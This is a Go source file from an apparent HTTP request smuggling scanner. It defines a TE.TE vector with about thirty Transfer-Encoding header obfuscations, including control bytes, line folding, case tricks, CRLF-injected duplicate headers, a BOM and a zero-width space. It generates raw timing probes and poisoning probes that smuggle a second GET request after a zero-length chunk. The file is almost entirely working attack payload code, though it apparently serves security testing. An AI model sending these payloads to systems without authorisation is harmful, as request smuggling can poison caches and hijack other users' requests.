package vectors

import (
	"fmt"

	"github.com/byteoverride/desynctrace/internal/client"
)

type TETEVector struct{}

func NewTETEVector() *TETEVector {
	return &TETEVector{}
}

func (v *TETEVector) Name() string {
	return "TE.TE (Obfuscated Transfer-Encoding)"
}

func (v *TETEVector) Type() VectorType {
	return TETE
}

// teObfuscation represents a single TE header obfuscation technique.
type teObfuscation struct {
	Name    string
	Key     string // header key (may contain spaces, tabs, etc.)
	Value   string // header value (may contain special chars)
	Notes   string // why this works
}

// allTEObfuscations returns all TE obfuscation variants.
// Each tricks one of the two servers into ignoring the TE header,
// causing it to fall back to CL, creating a CL.TE or TE.CL desync.
func allTEObfuscations() []teObfuscation {
	return []teObfuscation{
		// Spacing tricks
		{
			Name:  "space-before-colon",
			Key:   "Transfer-Encoding ",
			Value: "chunked",
			Notes: "Space before colon — some parsers reject, others accept",
		},
		{
			Name:  "space-after-colon",
			Key:   "Transfer-Encoding",
			Value: " chunked",
			Notes: "Leading space in value — may be trimmed by some, not others",
		},
		{
			Name:  "tab-before-colon",
			Key:   "Transfer-Encoding\t",
			Value: "chunked",
			Notes: "Tab before colon — horizontal whitespace handling varies",
		},
		{
			Name:  "tab-in-value",
			Key:   "Transfer-Encoding",
			Value: "\tchunked",
			Notes: "Tab before value",
		},

		// Whitespace and control character tricks
		{
			Name:  "vertical-tab-after-value",
			Key:   "Transfer-Encoding",
			Value: "chunked\x0b",
			Notes: "Vertical tab after value — some parsers include it in token comparison",
		},
		{
			Name:  "null-byte-after-value",
			Key:   "Transfer-Encoding",
			Value: "chunked\x00",
			Notes: "Null byte — C-based parsers may stop at null, Go/Java may not",
		},
		{
			Name:  "form-feed-after-value",
			Key:   "Transfer-Encoding",
			Value: "chunked\x0c",
			Notes: "Form feed character after value",
		},
		{
			Name:  "backspace-in-value",
			Key:   "Transfer-Encoding",
			Value: "chunked\x08",
			Notes: "Backspace character — edge case in tokenizer",
		},

		// Line folding (obs-fold) — deprecated in HTTP/1.1 but still supported by some
		{
			Name:  "line-folding-space",
			Key:   "Transfer-Encoding",
			Value: "\r\n chunked",
			Notes: "obs-fold with space — deprecated but Apache/older servers support",
		},
		{
			Name:  "line-folding-tab",
			Key:   "Transfer-Encoding",
			Value: "\r\n\tchunked",
			Notes: "obs-fold with tab — deprecated but some servers support",
		},

		// Case variations
		{
			Name:  "mixed-case",
			Key:   "TrAnSfEr-EnCoDiNg",
			Value: "chunked",
			Notes: "Mixed case — HTTP headers are case-insensitive per spec, but some parsers are strict",
		},
		{
			Name:  "all-uppercase",
			Key:   "TRANSFER-ENCODING",
			Value: "chunked",
			Notes: "All uppercase header name",
		},
		{
			Name:  "all-lowercase",
			Key:   "transfer-encoding",
			Value: "chunked",
			Notes: "All lowercase (unusual for some frameworks)",
		},
		{
			Name:  "value-mixed-case",
			Key:   "Transfer-Encoding",
			Value: "ChUnKeD",
			Notes: "Mixed case in 'chunked' value — spec says case-insensitive but implementation varies",
		},

		// Invalid/modified values
		{
			Name:  "value-cow",
			Key:   "Transfer-Encoding",
			Value: "cow",
			Notes: "Invalid TE value — server should reject/ignore, but frontend might still forward",
		},
		{
			Name:  "value-x-chunked",
			Key:   "Transfer-Encoding",
			Value: "x-chunked",
			Notes: "Custom TE value — some servers accept x- prefixed values",
		},
		{
			Name:  "value-chunked-with-quotes",
			Key:   "Transfer-Encoding",
			Value: "\"chunked\"",
			Notes: "Quoted value — some parsers strip quotes, others don't",
		},

		// Duplicate/multiple values
		{
			Name:  "double-value-comma",
			Key:   "Transfer-Encoding",
			Value: "chunked, cow",
			Notes: "Two values, one valid — which does the server use?",
		},
		{
			Name:  "double-value-reversed",
			Key:   "Transfer-Encoding",
			Value: "cow, chunked",
			Notes: "Invalid value first, then chunked — order-dependent parsing",
		},
		{
			Name:  "identity-chunked",
			Key:   "Transfer-Encoding",
			Value: "identity, chunked",
			Notes: "Identity then chunked — layered encoding interpretation",
		},
		{
			Name:  "chunked-identity",
			Key:   "Transfer-Encoding",
			Value: "chunked, identity",
			Notes: "Chunked then identity — order affects which is used",
		},

		// Duplicate headers (injected via raw header string)
		{
			Name:  "duplicate-te-different-values",
			Key:   "Transfer-Encoding",
			Value: "chunked\r\nTransfer-Encoding: cow",
			Notes: "Two TE headers — first vs last wins behavior",
		},
		{
			Name:  "duplicate-te-reversed",
			Key:   "Transfer-Encoding",
			Value: "cow\r\nTransfer-Encoding: chunked",
			Notes: "Two TE headers reversed — tests which one takes precedence",
		},

		// Underscore substitution
		{
			Name:  "underscore-instead-of-hyphen",
			Key:   "Transfer_Encoding",
			Value: "chunked",
			Notes: "Underscore instead of hyphen — nginx/PHP normalizes underscores, others reject",
		},

		// Zero-width characters (novel)
		{
			Name:  "zero-width-space",
			Key:   "Transfer-Encoding",
			Value: "chunked\xe2\x80\x8b",
			Notes: "Zero-width space (U+200B) appended — UTF-8 aware parsers may strip it",
		},

		// BOM prefix (novel)
		{
			Name:  "bom-prefix",
			Key:   "\xef\xbb\xbfTransfer-Encoding",
			Value: "chunked",
			Notes: "UTF-8 BOM before header name — byte-level parser confusion",
		},

		// Newline in header name (novel)
		{
			Name:  "newline-in-key",
			Key:   "Transfer-Encoding\r\n",
			Value: "chunked",
			Notes: "Newline after header name — may terminate header parsing early",
		},

		// Extra whitespace between tokens
		{
			Name:  "multiple-spaces-after-colon",
			Key:   "Transfer-Encoding",
			Value: "   chunked",
			Notes: "Multiple spaces before value — liberal whitespace handling varies",
		},
		{
			Name:  "trailing-spaces",
			Key:   "Transfer-Encoding",
			Value: "chunked   ",
			Notes: "Trailing spaces after value — some parsers trim, others include",
		},

		// Chunked with parameters (novel — RFC allows transfer-extension params)
		{
			Name:  "chunked-with-param",
			Key:   "Transfer-Encoding",
			Value: "chunked;q=1.0",
			Notes: "Parameter after chunked — some parsers accept transfer-extension parameters",
		},

		// Semicolon tricks
		{
			Name:  "semicolon-separator",
			Key:   "Transfer-Encoding",
			Value: "chunked; identity",
			Notes: "Semicolon separator instead of comma",
		},
	}
}

func (v *TETEVector) GeneratePayloads(baseReq *client.Request) []*client.Request {
	payloads := []*client.Request{}

	for _, obs := range allTEObfuscations() {
		req := &client.Request{
			Method: "POST",
			URL:    baseReq.URL,
			Headers: map[string]string{
				"Content-Type": "application/x-www-form-urlencoded",
			},
			TransferEncoding: "chunked",
			ContentLength:    4,
			Body:             []byte("5c\r\n"),
			RawHeaders:       fmt.Sprintf("%s: %s\r\n", obs.Key, obs.Value),
		}
		payloads = append(payloads, req)
	}

	return payloads
}

func (v *TETEVector) GenerateRawPayloads(host, path string) []RawPayload {
	var payloads []RawPayload

	for _, obs := range allTEObfuscations() {
		// CL.TE-style probe: incomplete chunk to trigger timeout
		{
			incompleteBody := "1\r\nZ\r\n"
			rawHeaders := fmt.Sprintf("Host: %s\r\n", host)
			rawHeaders += "Content-Type: application/x-www-form-urlencoded\r\n"
			rawHeaders += fmt.Sprintf("Content-Length: %d\r\n", len(incompleteBody))
			rawHeaders += fmt.Sprintf("%s: %s\r\n", obs.Key, obs.Value)
			rawHeaders += "Connection: keep-alive\r\n"

			raw := fmt.Sprintf("POST %s HTTP/1.1\r\n%s\r\n%s", path, rawHeaders, incompleteBody)
			payloads = append(payloads, RawPayload{
				Name:        fmt.Sprintf("tete-clte-%s", obs.Name),
				Data:        []byte(raw),
				Description: fmt.Sprintf("TE.TE/%s (CL.TE-style): %s", obs.Name, obs.Notes),
				Technique:   "tete-timing",
			})
		}

		// Poisoning probe: 0-chunk followed by smuggled request
		{
			smuggled := fmt.Sprintf("GET /desynctrace-tete-%s HTTP/1.1\r\nHost: %s\r\n\r\n", obs.Name, host)
			body := fmt.Sprintf("0\r\n\r\n%s", smuggled)
			rawHeaders := fmt.Sprintf("Host: %s\r\n", host)
			rawHeaders += "Content-Type: application/x-www-form-urlencoded\r\n"
			rawHeaders += fmt.Sprintf("Content-Length: %d\r\n", len(body))
			rawHeaders += fmt.Sprintf("%s: %s\r\n", obs.Key, obs.Value)
			rawHeaders += "Connection: keep-alive\r\n"

			raw := fmt.Sprintf("POST %s HTTP/1.1\r\n%s\r\n%s", path, rawHeaders, body)
			payloads = append(payloads, RawPayload{
				Name:        fmt.Sprintf("tete-poison-%s", obs.Name),
				Data:        []byte(raw),
				Description: fmt.Sprintf("TE.TE/%s (poisoning): %s", obs.Name, obs.Notes),
				Technique:   "tete-poisoning",
			})
		}
	}

	return payloads
}

func (v *TETEVector) Verify(resp *client.Response) bool {
	return resp.StatusCode >= 400
}
